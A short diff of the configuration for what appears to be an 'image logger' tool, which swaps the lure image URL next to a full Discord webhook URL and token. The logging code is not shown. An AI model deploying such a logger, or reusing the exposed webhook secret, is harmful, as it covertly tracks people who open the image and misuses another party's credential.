@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1439035687256195256/BnXd4jepWoknyKNfCbffz9Rrskk5xr8LfW7UhR87dBEO2twbGwJ2ILy_LHyGAmWiYhcv",
-    "image": "https://img.buzzfeed.com/buzzfeed-static/static/2017-02/28/10/asset/buzzfeed-prod-fastlane-01/sub-buzz-24899-1488294942-4.png", # You can also have a custom image by using a URL argument
+    "image": "https://th.bing.com/th/id/OIP.biN1wKGhpZY0u-Obd6TpTgAAAA?w=115&h=184&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
